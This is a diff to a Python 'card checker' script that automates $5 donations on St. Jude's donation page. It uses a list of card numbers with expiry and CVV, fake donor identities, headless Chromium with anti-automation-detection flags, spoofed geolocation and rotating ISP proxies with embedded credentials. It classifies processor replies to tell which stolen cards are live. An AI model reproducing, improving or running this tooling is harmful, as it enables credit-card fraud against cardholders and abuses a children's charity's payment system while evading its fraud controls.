@@ -1,11 +1,10 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-St. Jude Checker — v19 (Final Edition)
-- BrightData Scraping Browser
+St. Jude Checker — v22 (ISP Proxy)
+- Playwright Chromium
+- BrightData ISP Proxy
 - Read from /oms/v1/order API
-- Refresh per card
-- Retry logic
 """
 
 import re
@@ -28,18 +27,19 @@ CARDS = [
     "5362199060708113|06|2030|446",
 ]
 
-BD_USER = "brd-customer-hl_24c8058e-zone-scraping_browser1"
-BD_PASS = "eyr0v46j28pi"
+# ═══ BrightData ISP Proxy ═══
 BD_HOST = "brd.superproxy.io"
-BD_PORT = "9222"
+BD_PORT = "44445"
+BD_USER = "brd-customer-hl_24c8058e-zone-isp_proxy1"
+BD_PASS = "nz8wkj2j8dom"
 
 DONATE_URL = "https://www.stjude.org/donate/donate-to-st-jude.html"
 
 # ═══ إعدادات ═══
-RECONNECT_EVERY = 2           # إعادة اتصال كل N كروت
-MAX_FORM_RETRIES = 3          # محاولات الفورم
-MAX_RESPONSE_WAIT = 40        # ثواني انتظار الرد
-DELAY_BETWEEN_CARDS = 13      # انتظار بين الكروت
+RECONNECT_EVERY = 5
+MAX_FORM_RETRIES = 1
+MAX_RESPONSE_WAIT = 30
+DELAY_BETWEEN_CARDS = 13
 
 FIRST_NAMES = ["James", "John", "Robert", "Michael", "William", "David", "Richard"]
 LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller"]
@@ -76,6 +76,7 @@ REASON_MAP = {
     'CreditCardCVVInvalid': 'CVV_INVALID',
     'CVVInvalid': 'CVV_INVALID',
     'InvalidCVV': 'CVV_INVALID',
+    'CreditCardInvalidVerificationNumber': 'CVV_INVALID',
     
     # ═══ Declined ═══
     'CreditCardDeclined': 'DECLINED',
@@ -109,15 +110,15 @@ REASON_MAP = {
     'CardNotSupported': 'CARD_NOT_SUPPORTED',
     
     # ═══ Charge ═══
-    'Approved': 'CHARGE 1.0',
-    'Success': 'CHARGE 1.0',
-    'Charged': 'CHARGE 1.0',
-    'Completed': 'CHARGE 1.0',
-    'Authorized': 'CHARGE 1.0',
-    'Captured': 'CHARGE 1.0',
-    'PaymentApproved': 'CHARGE 1.0',
-    'PaymentSuccess': 'CHARGE 1.0',
-    'TransactionApproved': 'CHARGE 1.0',
+    'Approved': 'CHARGE $5',
+    'Success': 'CHARGE $5',
+    'Charged': 'CHARGE $5',
+    'Completed': 'CHARGE $5',
+    'Authorized': 'CHARGE $5',
+    'Captured': 'CHARGE $5',
+    'PaymentApproved': 'CHARGE $5',
+    'PaymentSuccess': 'CHARGE $5',
+    'TransactionApproved': 'CHARGE $5',
 }
 
 TEXT_PATTERNS = [
@@ -142,24 +143,22 @@ TEXT_PATTERNS = [
     (r"lost card[^.]*\.", "LOST_CARD"),
     (r"stolen card[^.]*\.", "STOLEN_CARD"),
     (r"card not supported[^.]*\.", "CARD_NOT_SUPPORTED"),
-    (r"thank you for your donation[^.]*\.", "CHARGE 1.0"),
-    (r"your donation was successful[^.]*\.", "CHARGE 1.0"),
-    (r"donation was successful[^.]*\.", "CHARGE 1.0"),
-    (r"donation complete[^.]*\.", "CHARGE 1.0"),
+    (r"thank you for your donation[^.]*\.", "CHARGE $5"),
+    (r"your donation was successful[^.]*\.", "CHARGE $5"),
+    (r"donation was successful[^.]*\.", "CHARGE $5"),
+    (r"donation complete[^.]*\.", "CHARGE $5"),
     (r"we are sorry[^.]*\.", "SERVER_ERROR"),
     (r"unable to process[^.]*\.", "SERVER_ERROR"),
 ]
 
 
 def extract_from_api(responses):
-    """استخراج الرد من /oms/v1/order"""
     for resp in reversed(responses):
         url = resp.get('url', '')
         body = resp.get('body', '')
         
         if '/oms/v1/order' not in url:
             continue
-        
         if not body:
             continue
         
@@ -171,7 +170,6 @@ def extract_from_api(responses):
             if reason:
                 mapped = REASON_MAP.get(reason, reason)
                 return mapped, f"{reason}: {description}"[:200]
-            
             if description:
                 return description[:200], description[:200]
         except:
@@ -181,14 +179,11 @@ def extract_from_api(responses):
 
 
 def extract_from_text(page_text):
-    """استخراج الرد من نص الصفحة"""
     text_lower = page_text.lower()
-    
     for pattern, code in TEXT_PATTERNS:
         if re.search(pattern, text_lower):
             m = re.search(pattern, text_lower)
             return code, m.group(0).strip()[:200]
-    
     return None, None
 
 
@@ -200,12 +195,34 @@ def make_email(f, l):
     return f"{f.lower()}{l.lower()}{random.randint(100,999)}@gmail.com"
 
 
+def get_random_ua():
+    uas = [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+    ]
+    return random.choice(uas)
+
+
 def connect_browser(p):
-    """اتصال بـ BrightData Scraping Browser"""
-    cdp_url = f"wss://{BD_USER}:{BD_PASS}@{BD_HOST}:{BD_PORT}"
-    print("🌐 Connecting to BrightData...", flush=True)
-    browser = p.chromium.connect_over_cdp(cdp_url, timeout=120000)
-    print("✅ Connected", flush=True)
+    """اتصال بـ Playwright Chromium + ISP Proxy"""
+    print("🌐 Launching Chromium with ISP Proxy...", flush=True)
+    
+    browser = p.chromium.launch(
+        headless=True,
+        args=[
+            '--disable-blink-features=AutomationControlled',
+            '--disable-dev-shm-usage',
+            '--no-sandbox',
+            '--disable-gpu',
+        ],
+        proxy={
+            "server": f"http://{BD_HOST}:{BD_PORT}",
+            "username": BD_USER,
+            "password": BD_PASS
+        }
+    )
+    print("✅ Connected with ISP Proxy", flush=True)
     return browser
 
 
@@ -230,14 +247,18 @@ def check_card(browser, card, idx, total):
     print(f"🔍 [{idx}/{total}] {num[:6]}****{num[-4:]}", flush=True)
     print(f"{'='*60}", flush=True)
     
-    # ═══ Retry Loop ═══
     for attempt in range(1, MAX_FORM_RETRIES + 1):
         context = None
         try:
-            # ═══ جلسة جديدة لكل كارت ═══
+            ua = get_random_ua()
+            
             context = browser.new_context(
                 viewport={"width": 1366, "height": 900},
-                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+                user_agent=ua,
+                locale="en-US",
+                timezone_id="America/New_York",
+                geolocation={"latitude": 40.7128, "longitude": -74.0060},
+                permissions=["geolocation"],
             )
             page = context.new_page()
             
@@ -389,7 +410,6 @@ def check_card(browser, card, idx, total):
             for i in range(MAX_RESPONSE_WAIT):
                 time.sleep(1)
                 
-                # ═══ 1. من API ═══
                 try:
                     responses = page.evaluate("() => window.__all_responses || []")
                     code, text = extract_from_api(responses)
@@ -400,7 +420,6 @@ def check_card(browser, card, idx, total):
                 except:
                     pass
                 
-                # ═══ 2. من الصفحة ═══
                 try:
                     page_text = page.inner_text("body")
                     code, text = extract_from_text(page_text)
@@ -411,23 +430,13 @@ def check_card(browser, card, idx, total):
                 except:
                     pass
             
-            # ═══ انتظر شوية قبل ما نقفل الـ context ═══
             time.sleep(2)
-            
-            # ═══ إعادة تحميل الصفحة قبل إغلاق الـ context ═══
-            print("🔄 Refreshing page before close...", flush=True)
-            try:
-                page.reload(wait_until="domcontentloaded", timeout=30000)
-                time.sleep(2)
-            except:
-                pass
             
             try:
                 context.close()
             except:
                 pass
             
-            # ═══ خروج من الـ Retry ═══
             break
         
         except Exception as e:
@@ -438,7 +447,6 @@ def check_card(browser, card, idx, total):
                 except:
                     pass
             
-            # ═══ Browser مات؟ ═══
             if "closed" in str(e).lower() or "target" in str(e).lower():
                 result_code = "ERR_BROWSER_CLOSED"
                 result_text = str(e)[:100]
@@ -468,13 +476,11 @@ def check_card(browser, card, idx, total):
 
 def main():
     print("=" * 60, flush=True)
-    print("  St. Jude Checker — v19 (Final)", flush=True)
+    print("  St. Jude Checker — v22 (ISP Proxy)", flush=True)
     print("=" * 60, flush=True)
     print(f"📁 Cards: {len(CARDS)}", flush=True)
     print(f"🔄 Reconnect every: {RECONNECT_EVERY}", flush=True)
-    print(f"🔄 Form retries: {MAX_FORM_RETRIES}", flush=True)
     print(f"⏱️ Response wait: {MAX_RESPONSE_WAIT}s", flush=True)
-    print(f"⏸️ Delay between cards: {DELAY_BETWEEN_CARDS}s", flush=True)
     print("=" * 60, flush=True)
     
     results = []
@@ -488,7 +494,6 @@ def main():
             browser = connect_browser(p)
             
             for idx, card in enumerate(CARDS, 1):
-                # ═══ إعادة اتصال كل N كروت ═══
                 if cards_since_reconnect >= RECONNECT_EVERY:
                     print(f"\n🔄 Reconnecting (after {cards_since_reconnect})...", flush=True)
                     try:
@@ -503,7 +508,6 @@ def main():
                         print(f"❌ Reconnect failed: {str(e)[:100]}", flush=True)
                         break
                 
-                # ═══ Check ═══
                 try:
                     code, text, elapsed = check_card(browser, card, idx, len(CARDS))
                 except Exception as e:
@@ -519,7 +523,6 @@ def main():
                 
                 cards_since_reconnect += 1
                 
-                # ═══ انتظار ═══
                 if idx < len(CARDS):
                     print(f"\n⏸️ Waiting {DELAY_BETWEEN_CARDS}s...", flush=True)
                     time.sleep(DELAY_BETWEEN_CARDS)
@@ -534,7 +537,6 @@ def main():
     
     total_time = round(time.time() - t_start, 1)
     
-    # ═══ النتائج النهائية ═══
     print("\n" + "=" * 60, flush=True)
     print("📊 FINAL RESULTS", flush=True)
     print("=" * 60, flush=True)
@@ -547,7 +549,7 @@ def main():
         'INSUFFICIENT_FUNDS', 'DECLINED', 'EXPIRED_CARD', 'CVV_INVALID',
         'INVALID_CARD', 'INVALID_CARD_NUMBER', 'DO_NOT_HONOR',
         'RESTRICTED_CARD', 'SUSPECTED_FRAUD', 'LOST_CARD', 'STOLEN_CARD',
-        'CARD_NOT_SUPPORTED', 'CHARGE 1.0'
+        'CARD_NOT_SUPPORTED', 'CHARGE $5'
     ]
     
     for r in results:
